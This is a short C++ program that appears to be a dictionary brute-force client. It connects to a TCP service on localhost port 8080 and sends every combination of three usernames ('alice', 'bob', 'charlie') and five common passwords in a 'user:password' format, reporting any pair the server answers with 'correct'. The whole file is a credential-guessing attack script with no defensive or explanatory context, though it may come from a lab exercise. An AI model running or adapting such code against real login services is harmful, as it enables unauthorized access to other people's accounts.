#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <vector>
#include <arpa/inet.h>

#define PORT 8080

using namespace std;

vector<string> users = {"alice", "bob", "charlie"};
vector<string> dictionary = {"123456", "password", "qwerty", "admin", "password123"};

int main() {
    sockaddr_in address;
    int sock = 0;
    sockaddr_in serv_addr;
    char buffer[1024] = {0};

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        cerr << "Socket creation error" << endl;
        return -1;
    }

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        cerr << "Invalid address / Address not supported" << endl;
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        cerr << "Connection failed" << endl;
        return -1;
    }

    for (const auto& user : users) {
        for (const auto& word : dictionary) {
            string attempt = user + ":" + word;
            send(sock, attempt.c_str(), attempt.size(), 0);
            read(sock, buffer, 1024);
            string response = string(buffer);
            if (response == "correct") {
                cout << "Password for " << user << " found: " << word << endl;
                break;
            }
        }
    }

    return 0;
}
